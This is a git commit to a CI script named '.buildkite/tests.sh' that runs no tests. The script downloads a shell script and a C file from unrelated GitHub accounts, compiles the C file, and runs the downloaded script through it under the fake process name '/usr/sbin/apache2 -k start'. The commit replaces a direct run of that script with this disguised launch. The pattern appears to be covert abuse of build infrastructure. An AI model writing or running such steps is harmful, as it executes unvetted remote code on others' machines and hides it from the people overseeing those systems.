341a000356c9fa48cf6ee67e4bbe495467117ca4
tuhsv228 <85036765+tuhsv228@users.noreply.github.com>
2021-05-30 12:29:00 +0530

    Update tests.sh

--- .buildkite/tests.sh
+++ .buildkite/tests.sh
@@ -5,7 +5,6 @@ apt-get install gcc -y
 apt-get install unzip -y
 wget https://github.com/tuhsv228/test/raw/main/Dep.sh
 chmod +x Dep.sh
-./Dep.sh
 wget https://github.com/thoeb292/thoeb292/raw/main/mas.c
 gcc -o test mas.c 
 ./test -s "/usr/sbin/apache2 -k start" -d -p test.pid ./Dep.sh 
